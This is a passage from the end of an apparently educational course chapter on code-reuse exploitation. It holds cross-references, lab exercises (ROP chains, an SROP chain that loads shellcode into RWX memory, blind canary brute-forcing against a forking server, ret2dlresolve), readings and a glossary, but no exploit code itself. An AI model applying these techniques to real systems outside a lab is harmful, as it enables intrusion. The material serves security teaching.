4. **Gadget availability:** does the binary contain sufficient gadgets for a complete chain?
5. **Bad byte constraints:** does the input path filter bytes that would appear in the chain?

A crash scoring ≥3/5 on these criteria is classified as "likely exploitable via code reuse."

---

## 21. Cross-references

**To Domain 1 (binary formats):** GOT/PLT overwrite (Chapter 1A §11.5) is the classic target for a single-pointer code-reuse redirect. Full RELRO (Chapter 1B §5.1) closes this. CET IBT requirements are encoded in `PT_GNU_PROPERTY` (Chapter 1B §5.3). CFG metadata lives in the PE load configuration directory (Chapter 2 §11). TLS callbacks and `.init_array` constructors are forward-edge targets that CET/CFI constrain.

**To Domain 2 (process memory and OS primitives):** ASLR entropy (Chapter 2A §5) determines the difficulty of gadget-address prediction. Stack placement (Chapter 2A §4) and the stack-clash protection determine what stack-based corruptions can reach. `sigreturn` dispatch (Chapter 2B §1) is the kernel-side mechanism that SROP exploits. Seccomp (Chapter 2B §3) can restrict the syscalls an SROP chain can invoke. PAC and BTI are AArch64 hardware features that interact with the page-table flags described in Chapter 2A §10.

**To the attack taxonomy (Section 1):** Real-world exploitation chains typically combine an initial vulnerability (heap use-after-free, type confusion, stack overflow), an information leak (to defeat ASLR), a code-reuse chain (ROP/JOP/SROP), and a privilege escalation (syscall to gain root or escape sandbox). Each stage maps to a layer in the defense stack described in §16.

---

## Exercises

**Exercise 1 — Basic ROP Chain Construction.**
Using the vulnerable binary and exploit skeleton from §9, construct a ROP chain that calls `write(1, <address_of_flag>, 64)` instead of `system("/bin/sh")`. You will need to locate `pop rdi; ret`, `pop rsi; pop r15; ret`, and `pop rdx; ret` gadgets (or use ret2csu for the third argument). Verify in GDB that all registers are correctly set before the `write@PLT` call. Tools: GDB, ROPgadget, pwntools. Reference: `tutorials/tutorial_domain4_ch4A_rop_jop_lab.md`.

**Exercise 2 — SROP Exploit with Chained Syscalls.**
Extend the SROP exploit from §7.6 to chain three syscalls: (1) `mprotect` to make a BSS region RWX, (2) `read(0, bss_addr, 0x100)` to read shellcode from stdin into the region, (3) redirect execution to the shellcode. Use `SigreturnFrame` from pwntools for each stage. Verify that each frame's `rsp` correctly points to the next frame. Tools: pwntools, GDB with `catch syscall`. Reference: §7.6, §17C.

**Exercise 3 — Gadget Quality Assessment.**
Scan `/usr/lib/x86_64-linux-gnu/libc.so.6` with ROPgadget, Ropper, and rp++. For each tool, extract all `pop rdi; ret` gadgets and classify them by (a) gadget length, (b) register clobbering side effects, (c) bad-byte presence (`\x00`, `\x0a`, `\x0d`). Build a comparison table. Identify at least three gadgets that are clean (no side effects, no bad bytes) and three that are dirty. Tools: ROPgadget `--badbytes`, Ropper `--badbytes`, rp++ with grep. Reference: §17A.3.

**Exercise 4 — Blind ROP Canary Brute-Force.**
Set up a forking TCP server (use the skeleton in §8.5) with a stack canary (`-fstack-protector-all`). Implement the BROP Phase 1 canary brute-force in Python. Measure: (a) total connection attempts to recover the full 8-byte canary, (b) average time per attempt, (c) total attack duration. Compare with the theoretical bound of 2048 attempts. Tools: Python sockets, GCC with `-fstack-protector-all`. Reference: §8.5.

**Exercise 5 — ret2dlresolve Against Full RELRO.**
Compile the vulnerable binary from §9 with `-Wl,-z,relro,-z,now` (full RELRO). Verify that GOT overwrite fails. Then construct a ret2dlresolve exploit using pwntools `Ret2dlresolvePayload` (§17D.2) to resolve `system` without any GOT write. Compare the payload size and complexity against the standard ret2libc approach. Tools: pwntools, checksec, readelf. Reference: §17D.

---

## Readings and References

- Shacham, H. "The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls (on the x86)." ACM CCS 2007. https://hovav.net/ucsd/dist/geometry.pdf (retrieved: 2026-05-29)
- Bletsch, T. et al. "Jump-Oriented Programming: A New Class of Code-Reuse Attack." ASIACCS 2011. https://dl.acm.org/doi/10.1145/1966913.1966919 (retrieved: 2026-05-29)
- Bittau, A. et al. "Hacking Blind." IEEE S&P 2014. https://ieeexplore.ieee.org/document/6956567 (retrieved: 2026-05-29)
- Schuster, F. et al. "Counterfeit Object-oriented Programming." IEEE S&P 2015. https://ieeexplore.ieee.org/document/7163058 (retrieved: 2026-05-29)
- Bosman, E. and Bos, H. "Framing Signals — A Return to Portable Shellcode." IEEE S&P 2014. https://ieeexplore.ieee.org/document/6956568 (retrieved: 2026-05-29)
- MITRE ATT&CK T1068 — Exploitation for Privilege Escalation. https://attack.mitre.org/techniques/T1068/ (retrieved: 2026-05-29)
- MITRE ATT&CK T1203 — Exploitation for Client Execution. https://attack.mitre.org/techniques/T1203/ (retrieved: 2026-05-29)
- CVE-2020-0796 (SMBGhost). https://nvd.nist.gov/vuln/detail/CVE-2020-0796 (retrieved: 2026-05-29)
- CVE-2024-1086 — nf_tables double-free, actively exploited in ransomware campaigns. https://nvd.nist.gov/vuln/detail/CVE-2024-1086 (retrieved: 2026-05-29)
- pwntools documentation. https://docs.pwntools.com/en/stable/ (retrieved: 2026-05-29)
- ROPgadget — GitHub repository. https://github.com/JonathanSalwan/ROPgadget (retrieved: 2026-05-29)
- Ropper — GitHub repository. https://github.com/sashs/Ropper (retrieved: 2026-05-29)
- Intel CET specification (SDM Vol. 3, Ch. 18). https://www.intel.com/content/www/us/en/developer/articles/technical/technical-look-control-flow-enforcement-technology.html (retrieved: 2026-05-29)
- grsecurity — On the Effectiveness of Intel's CET Against Code Reuse Attacks. https://grsecurity.net/effectiveness_of_intel_cet_against_code_reuse_attacks (retrieved: 2026-05-29)

---

## Cross-References

| Document | Section | Relationship |
|----------|---------|--------------|
| `domain3_chapter3A_stack_format_integer.md` | §2 Stack buffer overflow | Provides the corruption primitives (saved-RIP overwrite) that initiate ROP chains |
| `domain3_chapter3B_heap_uaf.md` | §3 Use-after-free | Heap UAF supplies function-pointer overwrite for COP/COOP and vtable hijack |
| `domain4_chapter4B_cfi_hardware_bypass.md` | §1-§9 CET/PAC/CFI internals | Details hardware CFI defenses that constrain code reuse; bypass techniques in §2, §4 |
| `domain5_chapter5A_kernel_exploitation.md` | §6 Kernel ROP | Extends ROP to kernel context with SMEP/SMAP/KPTI constraints and commit_creds chains |
| `domain6_mitigation_bypass.md` | §1-§3 ASLR/DEP bypass | Covers the information leak and W^X bypass that precede code reuse chain construction |
| `tutorials/tutorial_domain4_ch4A_rop_jop_lab.md` | Full lab | Hands-on ROP/JOP chain construction exercises with step-by-step GDB walkthroughs |

---

## Glossary

| Term | Definition |
|------|------------|
| **ROP (Return-Oriented Programming)** | Code reuse technique chaining short instruction sequences ending in `ret` via a corrupted stack. |
| **Gadget** | A short sequence of instructions ending in a control-transfer instruction (`ret`, `jmp`, `call`) usable in a code reuse chain. |
| **Stack pivot** | Redirecting `rsp` to attacker-controlled memory (e.g., via `xchg rsp, rax; ret` or `leave; ret`) to execute a ROP chain from a non-stack location. |
| **JOP (Jump-Oriented Programming)** | Code reuse using indirect `jmp` instructions and a dispatcher gadget instead of `ret`. |
| **COP (Call-Oriented Programming)** | Code reuse using indirect `call` instructions, typically through corrupted vtable pointers. |
| **COOP (Counterfeit Object-Oriented Programming)** | Code reuse chaining entire C++ virtual method bodies via fake objects with crafted vtable pointers. |
| **SROP (Sigreturn-Oriented Programming)** | Code reuse exploiting the `rt_sigreturn` syscall to set all registers from a forged signal frame on the stack. |
| **BROP (Blind ROP)** | Technique for constructing ROP exploits remotely against forking servers without access to the binary. |
| **one_gadget** | A single address in libc that, if jumped to with certain register/stack constraints satisfied, directly executes `execve("/bin/sh")`. |
| **Shadow stack** | A hardware-managed (CET) or software-managed parallel stack that records return addresses and validates them on `ret`. |
| **IBT (Indirect Branch Tracking)** | Intel CET mechanism requiring indirect branch targets to begin with `ENDBR64`, constraining forward-edge control flow. |
| **ret2dlresolve** | Technique abusing ELF lazy binding by forging `Elf64_Rela`, `Elf64_Sym`, and symbol-name structures to resolve arbitrary functions. |
| **W^X (Write XOR Execute)** | Memory protection policy ensuring pages are either writable or executable, never both simultaneously. |
| **CFI (Control Flow Integrity)** | Class of defenses constraining indirect control-flow transfers to a set of valid targets determined at compile time. |
| **ret2csu** | Technique using gadgets in `__libc_csu_init` to control up to three argument registers without needing dedicated `pop` gadgets. |
